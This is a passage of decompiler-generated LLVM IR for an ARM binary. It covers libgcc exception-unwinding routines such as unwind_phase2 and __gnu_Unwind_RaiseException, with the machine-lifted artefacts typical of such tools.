  %v1_1823c = and i32 %v2_18238, 1073741824
  %v2_1823c = icmp eq i32 %v1_1823c, 0
  %v2_18240 = or i32 %v2_18238, -2147483648
  %tmp83 = bitcast i32 %v2_18238 to float
  %tmp84 = call float @fabsf(float %tmp83)
  %v2_18244 = bitcast float %tmp84 to i32
  %v0_18248 = select i1 %v2_1823c, i32 %v2_18244, i32 %v2_18240
  %v2_18248 = add i32 %v0_18248, %v2_181dc
  %v1_1824c = load i32, i32* %r6.global-to-local, align 4
  %v2_1824c = add i32 %v1_1824c, 72
  %v3_1824c = inttoptr i32 %v2_1824c to i32*
  store i32 %v2_18248, i32* %v3_1824c, align 4
  %v0_18250 = load i32, i32* %r7.global-to-local, align 4
  %v1_18250 = add i32 %v0_18250, 4
  %v2_18250 = inttoptr i32 %v1_18250 to i32*
  %v3_18250 = load i32, i32* %v2_18250, align 4
  %v7_18254 = icmp eq i32 %v3_18250, 1
  br i1 %v7_18254, label %.thread10, label %dec_label_pc_18268

.thread10:                                        ; preds = %dec_label_pc_18238
  %v1_18254 = add i32 %v3_18250, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_18260 = load i32, i32* %r6.global-to-local, align 4
  %v3_18260 = add i32 %v2_18260, 16
  %v4_18260 = inttoptr i32 %v3_18260 to i32*
  store i32 %v1_18254, i32* %v4_18260, align 4
  br label %dec_label_pc_18168

dec_label_pc_18268:                               ; preds = %dec_label_pc_18238
  %v1_18268 = icmp slt i32 %v3_18250, 0
  br i1 %v1_18268, label %.thread38, label %dec_label_pc_18280

.thread38:                                        ; preds = %dec_label_pc_18268
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_18274 = load i32, i32* %r6.global-to-local, align 4
  %v5_18274 = add i32 %v4_18274, 76
  %v6_18274 = inttoptr i32 %v5_18274 to i32*
  store i32 %v1_18250, i32* %v6_18274, align 4
  %v3_18278 = load i32, i32* %r2.global-to-local, align 4
  %v4_18278 = load i32, i32* %r6.global-to-local, align 4
  %v5_18278 = add i32 %v4_18278, 80
  %v6_18278 = inttoptr i32 %v5_18278 to i32*
  store i32 %v3_18278, i32* %v6_18278, align 4
  br label %dec_label_pc_182a0

dec_label_pc_18280:                               ; preds = %dec_label_pc_18268
  %v1_18280 = and i32 %v3_18250, 1073741824
  %v2_18280 = icmp eq i32 %v1_18280, 0
  %v2_18284 = or i32 %v3_18250, -2147483648
  %tmp85 = bitcast i32 %v3_18250 to float
  %tmp86 = call float @fabsf(float %tmp85)
  %v2_18288 = bitcast float %tmp86 to i32
  %storemerge42 = select i1 %v2_18280, i32 %v2_18288, i32 %v2_18284
  %v1_1828c = add i32 %storemerge42, 4
  %v2_18290 = add i32 %v1_1828c, %v0_18250
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_18298 = load i32, i32* %r6.global-to-local, align 4
  %v2_18298 = add i32 %v1_18298, 76
  %v3_18298 = inttoptr i32 %v2_18298 to i32*
  store i32 %v2_18290, i32* %v3_18298, align 4
  %v0_1829c = load i32, i32* %r2.global-to-local, align 4
  %v1_1829c = load i32, i32* %r6.global-to-local, align 4
  %v2_1829c = add i32 %v1_1829c, 80
  %v3_1829c = inttoptr i32 %v2_1829c to i32*
  store i32 %v0_1829c, i32* %v3_1829c, align 4
  br label %dec_label_pc_182a0

dec_label_pc_182a0:                               ; preds = %.thread38, %dec_label_pc_18280
  %v0_182a0 = load i32, i32* %r6.global-to-local, align 4
  %v1_182a0 = add i32 %v0_182a0, 76
  %v2_182a0 = inttoptr i32 %v1_182a0 to i32*
  %v3_182a0 = load i32, i32* %v2_182a0, align 4
  store i32 %v3_182a0, i32* %r2.global-to-local, align 4
  %v1_182a4 = inttoptr i32 %v3_182a0 to i32*
  %v2_182a4 = load i32, i32* %v1_182a4, align 4
  %v1_182a8 = icmp slt i32 %v2_182a4, 0
  br i1 %v1_182a8, label %dec_label_pc_182cc, label %dec_label_pc_182b0

dec_label_pc_182b0:                               ; preds = %dec_label_pc_182a0
  %v1_182b0 = and i32 %v2_182a4, 1073741824
  %v2_182b0 = icmp eq i32 %v1_182b0, 0
  %v2_182b4 = or i32 %v2_182a4, -2147483648
  %tmp87 = bitcast i32 %v2_182a4 to float
  %tmp88 = call float @fabsf(float %tmp87)
  %v2_182b8 = bitcast float %tmp88 to i32
  %v0_182bc = select i1 %v2_182b0, i32 %v2_182b8, i32 %v2_182b4
  %v2_182bc = add i32 %v0_182bc, %v3_182a0
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_182c4 = add i32 %v0_182a0, 16
  %v3_182c4 = inttoptr i32 %v2_182c4 to i32*
  store i32 %v2_182bc, i32* %v3_182c4, align 4
  br label %dec_label_pc_18168

dec_label_pc_182cc:                               ; preds = %dec_label_pc_182a0
  %v3_182cc = udiv i32 %v2_182a4, 16777216
  %v1_182d0 = urem i32 %v3_182cc, 16
  %v2_182d0 = icmp eq i32 %v1_182d0, 0
  br i1 %v2_182d0, label %dec_label_pc_182d8, label %dec_label_pc_182ec

dec_label_pc_182d8:                               ; preds = %dec_label_pc_182cc
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_182e0 = load i32, i32* %r5.global-to-local, align 4
  %v2_182e0 = add i32 %v0_182e0, -42008
  %v2_182e4 = add i32 %v0_182a0, 16
  %v3_182e4 = inttoptr i32 %v2_182e4 to i32*
  store i32 %v2_182e0, i32* %v3_182e4, align 4
  br label %dec_label_pc_18168

dec_label_pc_182ec:                               ; preds = %dec_label_pc_182cc
  %v7_182ec = icmp eq i32 %v1_182d0, 1
  br i1 %v7_182ec, label %dec_label_pc_18310, label %dec_label_pc_182f4

dec_label_pc_182f4:                               ; preds = %dec_label_pc_182ec
  %v7_182f4 = icmp eq i32 %v1_182d0, 2
  br i1 %v7_182f4, label %dec_label_pc_182fc, label %dec_label_pc_181b0

dec_label_pc_182fc:                               ; preds = %dec_label_pc_182f4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_18304 = load i32, i32* %r5.global-to-local, align 4
  %v2_18304 = add i32 %v0_18304, -42024
  %v2_18308 = add i32 %v0_182a0, 16
  %v3_18308 = inttoptr i32 %v2_18308 to i32*
  store i32 %v2_18304, i32* %v3_18308, align 4
  br label %dec_label_pc_18168

dec_label_pc_18310:                               ; preds = %dec_label_pc_182ec
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_18318 = load i32, i32* %r5.global-to-local, align 4
  %v2_18318 = add i32 %v0_18318, -42016
  %v2_1831c = add i32 %v0_182a0, 16
  %v3_1831c = inttoptr i32 %v2_1831c to i32*
  store i32 %v2_18318, i32* %v3_1831c, align 4
  br label %dec_label_pc_18168

; uselistorder directives
  uselistorder i32 %v1_182d0, { 2, 1, 0 }
  uselistorder i32 %v0_182a0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_18250, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_18220, { 1, 0 }
  uselistorder i32 %v3_181d8, { 2, 1, 0 }
  uselistorder i32 %v3_181d4, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_181cc, { 1, 0 }
  uselistorder i32 %v0_181cc, { 1, 0 }
  uselistorder i32 %v2_181a0, { 1, 0 }
  uselistorder i32 %v0_181dc.pre, { 1, 0 }
  uselistorder i32 %v3_1818c, { 1, 0 }
  uselistorder i32 %v1_18140, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9 }
  uselistorder i32* %r2.global-to-local, { 6, 1, 2, 7, 8, 9, 10, 11, 12, 13, 0, 15, 3, 4, 14, 5 }
  uselistorder label %dec_label_pc_182a0, { 1, 0 }
  uselistorder label %dec_label_pc_1821c, { 1, 0 }
  uselistorder label %dec_label_pc_181cc, { 1, 0 }
  uselistorder label %dec_label_pc_181b0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18168, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_18328(i32 %arg1) local_unnamed_addr {
dec_label_pc_18328:
  %v0_18328 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18328, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_18328
  %v2_18328 = load i32, i32* @ip, align 4
  %v4_18328 = mul i32 %v2_18328, 2
  %v5_18328 = and i32 %v4_18328, %arg1
  %v2_1832c = load i32, i32* @r4, align 4
  %v8_1832c = shl i32 %v2_1832c, %v5_18328
  %v9_1832c = and i32 %v8_1832c, %v5_18328
  %v8_18330 = lshr i32 %v2_1832c, %v9_1832c
  %v9_18330 = and i32 %v8_18330, %v9_1832c
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_18328, %bb
  %v10_18330 = phi i32 [ %arg1, %dec_label_pc_18328 ], [ %v9_18330, %bb ]
  ret i32 %v10_18330

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @unwind_phase2_forced(i32 %ucbp, i32 %entry_vrs, i32 %resuming) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %next_vrs_-648 = alloca i32, align 4
  %saved_vrs_-344 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %v1_18344 = add i32 %entry_vrs, 4
  store i32 %ucbp, i32* @r5, align 4
  store i32 %resuming, i32* @r6, align 4
  %v1_18358 = inttoptr i32 %v1_18344 to i32*
  %v2_18358 = load i32, i32* %v1_18358, align 4
  store i32 %v2_18358, i32* %r0.global-to-local, align 4
  %v12_18358 = add i32 %entry_vrs, 20
  %v1_18364 = inttoptr i32 %v12_18358 to i32*
  %v2_18364 = load i32, i32* %v1_18364, align 4
  store i32 %v2_18364, i32* %r0.global-to-local, align 4
  %v12_18364 = add i32 %entry_vrs, 36
  %v1_1836c = inttoptr i32 %v12_18364 to i32*
  %v2_1836c = load i32, i32* %v1_1836c, align 4
  store i32 %v2_1836c, i32* %r0.global-to-local, align 4
  %v12_1836c = add i32 %entry_vrs, 52
  store i32 %v12_1836c, i32* @ip, align 4
  %v13_18370 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v13_18370, i32* @lr, align 4
  %v1_18374 = inttoptr i32 %v12_1836c to i32*
  %v2_18374 = load i32, i32* %v1_18374, align 4
  store i32 %v2_18374, i32* %r0.global-to-local, align 4
  %v9_18374 = add i32 %entry_vrs, 64
  %v10_18374 = inttoptr i32 %v9_18374 to i32*
  %v11_18374 = load i32, i32* %v10_18374, align 4
  store i32 0, i32* @r4, align 4
  %v1_1837c = add i32 %ucbp, 12
  %v2_1837c = inttoptr i32 %v1_1837c to i32*
  %v3_1837c = load i32, i32* %v2_1837c, align 4
  store i32 %v2_18374, i32* %stack_var_-292, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 0, i32* %saved_vrs_-344, align 4
  %v2_18394 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_18374)
  store i32 %v2_18394, i32* %r0.global-to-local, align 4
  %v0_18398 = load i32, i32* @r6, align 4
  %v1_18398 = load i32, i32* @r4, align 4
  %v9_18398 = icmp eq i32 %v0_18398, %v1_18398
  store i32 %v2_18394, i32* @r7, align 4
  %.pre = ptrtoint i32* %saved_vrs_-344 to i32
  br i1 %v9_18398, label %dec_label_pc_183ac, label %.thread

.thread:                                          ; preds = %entry
  br label %dec_label_pc_183b8

dec_label_pc_183ac:                               ; preds = %entry
  store i32 %v0_18398, i32* @r4, align 4
  br label %dec_label_pc_183b4

dec_label_pc_183b4:                               ; preds = %dec_label_pc_1847c, %dec_label_pc_183ac
  br label %dec_label_pc_183b8

dec_label_pc_183b8:                               ; preds = %.thread, %dec_label_pc_183b4
  %storemerge = phi i32 [ 10, %.thread ], [ 9, %dec_label_pc_183b4 ]
  store i32 %storemerge, i32* @r6, align 4
  %v2_183b8 = icmp eq i32 %v2_18394, 0
  br i1 %v2_183b8, label %dec_label_pc_18430, label %.thread2.dec_label_pc_183cc_crit_edge

.thread2.dec_label_pc_183cc_crit_edge:            ; preds = %dec_label_pc_183b8
  br label %dec_label_pc_183cc

dec_label_pc_183cc:                               ; preds = %.thread2.dec_label_pc_183cc_crit_edge, %dec_label_pc_18430
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_183dc = load i32, i32* @r5, align 4
  store i32 %v0_183dc, i32* @r3, align 4
  store i32 99308, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_1837c)
  br i1 false, label %dec_label_pc_183f4, label %dec_label_pc_1841c

dec_label_pc_183f4:                               ; preds = %dec_label_pc_183cc
  br i1 undef, label %dec_label_pc_183fc, label %dec_label_pc_18420

dec_label_pc_183fc:                               ; preds = %dec_label_pc_183f4
  br i1 undef, label %dec_label_pc_1847c, label %dec_label_pc_18414

dec_label_pc_18414:                               ; preds = %dec_label_pc_183fc
  br i1 undef, label %dec_label_pc_18474, label %dec_label_pc_1841c

dec_label_pc_1841c:                               ; preds = %dec_label_pc_183cc, %dec_label_pc_18414
  br label %dec_label_pc_18420

dec_label_pc_18420:                               ; preds = %dec_label_pc_183f4, %dec_label_pc_1841c
  store i32 9, i32* %r0.global-to-local, align 4
  ret i32 9

dec_label_pc_18430:                               ; preds = %dec_label_pc_183b8
  store i32 %v11_18374, i32* @r3, align 4
  %v2_18434 = ptrtoint i32* %next_vrs_-648 to i32
  store i32 %v2_18434, i32* @r4, align 4
  %v1_18438 = load i32, i32* @r5, align 4
  %v2_18438 = add i32 %v1_18438, 20
  %v3_18438 = inttoptr i32 %v2_18438 to i32*
  store i32 %v11_18374, i32* %v3_18438, align 4
  store i32 %v2_18434, i32* @r0, align 4
  store i32 %.pre, i32* @r1, align 4
  store i32 304, i32* @r2, align 4
  %v0_18448 = call i32 @memcpy()
  %v0_18450 = load i32, i32* @r6, align 4
  store i32 %v0_18450, i32* %r0.global-to-local, align 4
  %v0_18454 = load i32, i32* @r5, align 4
  %v1_18458 = add i32 %v0_18454, 16
  %v2_18458 = inttoptr i32 %v1_18458 to i32*
  %v3_18458 = load i32, i32* %v2_18458, align 4
  store i32 %v3_18458, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_18458)
  %v0_18468 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_18468, i32* @r4, align 4
  br label %dec_label_pc_183cc

dec_label_pc_18474:                               ; preds = %dec_label_pc_18414
  br label %dec_label_pc_1847c

dec_label_pc_1847c:                               ; preds = %dec_label_pc_183fc, %dec_label_pc_18474
  br label %dec_label_pc_183b4

; uselistorder directives
  uselistorder i32 %v11_18374, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 ()* @memcpy, { 4, 20, 19, 18, 14, 13, 12, 3, 2, 11, 24, 1, 10, 15, 9, 8, 0, 17, 16, 7, 6, 5, 23, 22, 21 }
  uselistorder i32* @r3, { 111, 112, 80, 81, 14, 15, 82, 83, 9, 84, 85, 86, 87, 31, 32, 33, 34, 35, 36, 37, 56, 57, 58, 61, 62, 63, 64, 65, 66, 67, 68, 70, 3, 69, 7, 41, 17, 19, 20, 113, 16, 114, 115, 71, 76, 77, 117, 118, 119, 120, 121, 122, 123, 4, 124, 125, 126, 5, 127, 128, 129, 6, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 0, 148, 149, 150, 151, 88, 89, 90, 91, 92, 93, 95, 96, 97, 98, 99, 100, 101, 18, 116, 152, 153, 162, 163, 164, 161, 154, 155, 156, 157, 1, 158, 8, 102, 103, 159, 160, 38, 39, 10, 72, 73, 74, 75, 40, 59, 60, 78, 42, 104, 105, 11, 12, 13, 168, 165, 166, 167, 2, 169, 170, 171, 106, 107, 94, 21, 22, 49, 50, 51, 52, 53, 54, 108, 23, 109, 55, 43, 44, 45, 46, 47, 48, 24, 25, 26, 27, 28, 29, 30, 79, 110 }
  uselistorder i32 10, { 2, 4, 24, 26, 27, 8, 30, 33, 34, 35, 21, 22, 10, 9, 5, 38, 37, 11, 39, 12, 40, 13, 41, 42, 3, 43, 14, 44, 15, 16, 17, 25, 6, 23, 48, 0, 28, 29, 18, 36, 31, 32, 45, 46, 19, 47, 1, 7, 20 }
  uselistorder i32 %ucbp, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_1847c, { 1, 0 }
  uselistorder label %dec_label_pc_18420, { 1, 0 }
  uselistorder label %dec_label_pc_1841c, { 1, 0 }
  uselistorder label %dec_label_pc_183cc, { 1, 0 }
  uselistorder label %dec_label_pc_183b8, { 1, 0 }
}

define i32 @__gnu_Unwind_ForcedUnwind(i32 %ucbp, i32 %stop_fn, i8* %stop_arg, i32 %entry_vrs) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %stop_arg to i32
  %v2_18490 = add i32 %ucbp, 12
  %v3_18490 = inttoptr i32 %v2_18490 to i32*
  store i32 %stop_fn, i32* %v3_18490, align 4
  %v3_18494 = add i32 %ucbp, 24
  %v4_18494 = inttoptr i32 %v3_18494 to i32*
  store i32 %tmp, i32* %v4_18494, align 4
  %v1_18498 = add i32 %entry_vrs, 60
  %v2_18498 = inttoptr i32 %v1_18498 to i32*
  %v3_18498 = load i32, i32* %v2_18498, align 4
  %v2_184a0 = add i32 %entry_vrs, 64
  %v3_184a0 = inttoptr i32 %v2_184a0 to i32*
  store i32 %v3_18498, i32* %v3_184a0, align 4
  %v3_184a8 = call i32 @unwind_phase2_forced(i32 %entry_vrs, i32 0, i32 0)
  ret i32 %v3_184a8

; uselistorder directives
  uselistorder i32 %entry_vrs, { 2, 0, 1 }
}

define void @unwind_phase2(i32 %ucbp, i32 %vrs) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 %ucbp, i32* @r4, align 4
  store i32 %vrs, i32* @r5, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %v1_184c06 = add i32 %vrs, 64
  %v2_184c07 = inttoptr i32 %v1_184c06 to i32*
  %v3_184c08 = load i32, i32* %v2_184c07, align 4
  %v2_184c49 = call i32 @get_eit_entry(i32 %ucbp, i32 %v3_184c08)
  store i32 %v2_184c49, i32* %r0.global-to-local, align 4
  %v2_184c811 = icmp eq i32 %v2_184c49, 0
  br i1 %v2_184c811, label %dec_label_pc_184d0, label %dec_label_pc_18500

dec_label_pc_184d0:                               ; preds = %entry, %dec_label_pc_184d0.dec_label_pc_184bc_crit_edge
  %v0_184d0 = load i32, i32* @r5, align 4
  %v1_184d0 = add i32 %v0_184d0, 64
  %v2_184d0 = inttoptr i32 %v1_184d0 to i32*
  %v3_184d0 = load i32, i32* %v2_184d0, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_184d8 = load i32, i32* @r4, align 4
  %v2_184d8 = add i32 %v1_184d8, 20
  %v3_184d8 = inttoptr i32 %v2_184d8 to i32*
  store i32 %v3_184d0, i32* %v3_184d8, align 4
  %v0_184dc = load i32, i32* @r4, align 4
  %v1_184e4 = add i32 %v0_184dc, 16
  %v2_184e4 = inttoptr i32 %v1_184e4 to i32*
  %v3_184e4 = load i32, i32* %v2_184e4, align 4
  call void @__pseudo_branch(i32 %v3_184e4)
  %v0_184f0 = load i32, i32* %r0.global-to-local, align 4
  %v7_184f0 = icmp eq i32 %v0_184f0, 8
  br i1 %v7_184f0, label %dec_label_pc_184d0.dec_label_pc_184bc_crit_edge, label %dec_label_pc_184f8

dec_label_pc_184d0.dec_label_pc_184bc_crit_edge:  ; preds = %dec_label_pc_184d0
  %v0_184bc.pre = load i32, i32* @r4, align 4
  %v0_184c0.pre = load i32, i32* @r5, align 4
  store i32 %v0_184bc.pre, i32* %r0.global-to-local, align 4
  %v1_184c0 = add i32 %v0_184c0.pre, 64
  %v2_184c0 = inttoptr i32 %v1_184c0 to i32*
  %v3_184c0 = load i32, i32* %v2_184c0, align 4
  %v2_184c4 = call i32 @get_eit_entry(i32 %v0_184bc.pre, i32 %v3_184c0)
  store i32 %v2_184c4, i32* %r0.global-to-local, align 4
  %v2_184c8 = icmp eq i32 %v2_184c4, 0
  br i1 %v2_184c8, label %dec_label_pc_184d0, label %dec_label_pc_18500

dec_label_pc_184f8:                               ; preds = %dec_label_pc_184d0
  %v7_184f8 = icmp eq i32 %v0_184f0, 7
  br i1 %v7_184f8, label %dec_label_pc_18504, label %dec_label_pc_18500

dec_label_pc_18500:                               ; preds = %entry, %dec_label_pc_184d0.dec_label_pc_184bc_crit_edge, %dec_label_pc_184f8
  %v0_18500 = call i32 @abort()
  store i32 %v0_18500, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18504

dec_label_pc_18504:                               ; preds = %dec_label_pc_184f8, %dec_label_pc_18500
  %v0_18504 = load i32, i32* @r5, align 4
  %v1_18504 = add i32 %v0_18504, 4
  store i32 %v1_18504, i32* %r0.global-to-local, align 4
  %v1_18508 = inttoptr i32 %v1_18504 to i32*
  %v2_18508 = call i32 @__restore_core_regs(i32* %v1_18508)
  store i32 %v2_18508, i32* %r0.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 7, 9, 8, 5, 6, 0, 2, 1 }
  uselistorder label %dec_label_pc_18504, { 1, 0 }
  uselistorder label %dec_label_pc_18500, { 2, 1, 0 }
  uselistorder label %dec_label_pc_184d0, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %entry_vrs, i32* %r1.global-to-local, align 4
  %v1_1850c = add i32 %ucbp, 20
  %v2_1850c = inttoptr i32 %v1_1850c to i32*
  %v3_1850c = load i32, i32* %v2_1850c, align 4
  %v1_18514 = load i32, i32* %r1.global-to-local, align 4
  %v2_18514 = add i32 %v1_18514, 64
  %v3_18514 = inttoptr i32 %v2_18514 to i32*
  store i32 %v3_1850c, i32* %v3_18514, align 4
  %v1_18518 = add i32 %ucbp, 12
  %v2_18518 = inttoptr i32 %v1_18518 to i32*
  %v3_18518 = load i32, i32* %v2_18518, align 4
  %v2_1851c = icmp eq i32 %v3_18518, 0
  store i32 %ucbp, i32* @r4, align 4
  %v0_18528 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_18528, i32* @r5, align 4
  br i1 %v2_1851c, label %dec_label_pc_18530, label %dec_label_pc_1856c

dec_label_pc_18530:                               ; preds = %entry
  store i32 %ucbp, i32* %r1.global-to-local, align 4
  %v1_1853c = add i32 %ucbp, 16
  %v2_1853c = inttoptr i32 %v1_1853c to i32*
  %v3_1853c = load i32, i32* %v2_1853c, align 4
  call void @__pseudo_branch(i32 %v3_1853c)
  br i1 false, label %dec_label_pc_18564, label %dec_label_pc_18550

dec_label_pc_18550:                               ; preds = %dec_label_pc_18530
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint (i32* @global_var_f634.463 to i32))
  %v0_18558 = load i32, i32* @r4, align 4
  %v0_1855c = load i32, i32* @r5, align 4
  store i32 %v0_1855c, i32* %r1.global-to-local, align 4
  call void @unwind_phase2(i32 %v0_18558, i32 %v0_1855c)
  br label %dec_label_pc_18564

dec_label_pc_18564:                               ; preds = %dec_label_pc_18530, %dec_label_pc_18550
  %v0_18564 = load i32, i32* @r5, align 4
  %v1_18564 = add i32 %v0_18564, 4
  %v1_18568 = inttoptr i32 %v1_18564 to i32*
  %v2_18568 = call i32 @__restore_core_regs(i32* %v1_18568)
  %v1_18570.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1856c

dec_label_pc_1856c:                               ; preds = %entry, %dec_label_pc_18564
  %v1_18570 = phi i32 [ %v0_18528, %entry ], [ %v1_18570.pre, %dec_label_pc_18564 ]
  %v3_18570 = call i32 @unwind_phase2_forced(i32 1, i32 %v1_18570, i32 1)
  %v0_18574 = call i32 @abort()
  ret i32 %v0_18574

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32 ()* @abort, { 6, 5, 4, 3, 2, 1, 7, 8, 10, 9, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 78, 79, 80, 81, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 7, 5, 6, 8, 9, 10, 11, 64, 65, 66, 67, 68, 69, 70, 71, 72, 82, 25, 26, 27, 28, 29, 45, 46, 47, 73, 12, 83, 15, 84, 41, 24, 74, 23, 89, 93, 92, 91, 85, 86, 0, 18, 19, 13, 20, 21, 22, 87, 88, 90, 49, 48, 38, 39, 40, 35, 36, 37, 16, 42, 17, 76, 1, 75, 14, 43, 44, 30, 31, 32, 33, 34, 77, 2, 3, 4 }
  uselistorder i1 true, { 0, 3, 4, 5, 6, 7, 1, 137, 2, 118, 8, 9, 10, 11, 12, 13, 110, 111, 119, 120, 112, 14, 15, 16, 113, 114, 115, 121, 17, 18, 19, 22, 21, 20, 139, 140, 141, 142, 143, 144, 145, 116, 146, 147, 148, 125, 149, 150, 151, 152, 117, 153, 154, 155, 156, 157, 158, 159, 23, 160, 138, 161, 24, 25, 162, 163, 164, 165, 166, 26, 167, 168, 27, 28, 169, 29, 170, 171, 133, 32, 33, 34, 35, 30, 31, 134, 36, 135, 37, 172, 173, 174, 38, 175, 176, 177, 178, 179, 39, 40, 126, 41, 42, 43, 44, 136, 96, 180, 181, 182, 124, 183, 123, 45, 97, 98, 184, 128, 185, 186, 47, 187, 188, 48, 99, 190, 46, 191, 189, 192, 127, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 122, 193, 194, 195, 196, 197, 69, 102, 129, 198, 70, 101, 199, 71, 100, 200, 201, 202, 203, 72, 204, 130, 73, 104, 205, 74, 103, 206, 207, 75, 208, 209, 210, 211, 76, 212, 213, 214, 215, 77, 216, 217, 78, 79, 108, 80, 81, 82, 83, 109, 84, 218, 85, 132, 219, 220, 131, 221, 222, 86, 105, 87, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 89, 107, 90, 233, 234, 235, 91, 106, 236, 92, 88, 237, 238, 93, 94, 95 }
  uselistorder i32 %ucbp, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_1856c, { 1, 0 }
  uselistorder label %dec_label_pc_18564, { 1, 0 }
}

define i32 @__gnu_Unwind_RaiseException(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %saved_vrs_-320 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_18578 = load i32, i32* @r4, align 4
  store i32 %v3_18578, i32* %stack_var_-16, align 4
  %v6_18578 = load i32, i32* @r5, align 4
  %v9_18578 = load i32, i32* @r6, align 4
  %v12_18578 = load i32, i32* @lr, align 4
  %v1_1857c = add i32 %entry_vrs, 60
  %v2_1857c = inttoptr i32 %v1_1857c to i32*
  %v3_1857c = load i32, i32* %v2_1857c, align 4
  %v2_18580 = add i32 %entry_vrs, 64
  %v3_18580 = inttoptr i32 %v2_18580 to i32*
  store i32 %v3_1857c, i32* %v3_18580, align 4
  store i32 %entry_vrs, i32* @r6, align 4
  store i32 %ucbp, i32* @r5, align 4
  %v11_185b0 = load i32, i32* %v3_18580, align 4
  store i32 -1, i32* %saved_vrs_-320, align 4
  %v2_185c8 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_185b0)
  %v2_185cc = icmp eq i32 %v2_185c8, 0
  br i1 %v2_185cc, label %dec_label_pc_185d4, label %dec_label_pc_18608

dec_label_pc_185d4:                               ; preds = %entry
  %v0_185d4 = load i32, i32* @r5, align 4
  %v1_185dc = add i32 %v0_185d4, 16
  %v2_185dc = inttoptr i32 %v1_185dc to i32*
  %v3_185dc = load i32, i32* %v2_185dc, align 4
  call void @__pseudo_branch(i32 %v3_185dc)
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_185f4 = load i32, i32* %saved_vrs_-320, align 4
  %v1_185f8 = urem i32 %v2_185f4, 2
  %v2_185f8 = icmp eq i32 %v1_185f8, 0
  br i1 %v2_185f8, label %dec_label_pc_18618, label %dec_label_pc_18600

dec_label_pc_18600:                               ; preds = %dec_label_pc_185d4, %dec_label_pc_18618
  %v0_18600 = phi i1 [ false, %dec_label_pc_185d4 ], [ %phitmp, %dec_label_pc_18618 ]
  br i1 %v0_18600, label %dec_label_pc_18624, label %dec_label_pc_18608

dec_label_pc_18608:                               ; preds = %entry, %dec_label_pc_18600
  %v2_18610 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18610, i32* @r4, align 4
  store i32 %v6_18578, i32* @r5, align 4
  store i32 %v9_18578, i32* @r6, align 4
  store i32 %v12_18578, i32* @lr, align 4
  ret i32 9

dec_label_pc_18618:                               ; preds = %dec_label_pc_185d4
  %v2_18618 = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_18618, i32* @r0, align 4
  %v1_1861c = call i32 @__gnu_Unwind_Restore_VFP(i32 %v2_18618)
  %v0_18600.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_18600.pre, 6
  br label %dec_label_pc_18600

dec_label_pc_18624:                               ; preds = %dec_label_pc_18600
  %v0_18624 = load i32, i32* @r5, align 4
  %v0_18628 = load i32, i32* @r6, align 4
  call void @unwind_phase2(i32 %v0_18624, i32 %v0_18628)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder void (i32, i32)* @unwind_phase2, { 1, 0 }
  uselistorder i32 (i32, i32)* @get_eit_entry, { 3, 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 2, 1 }
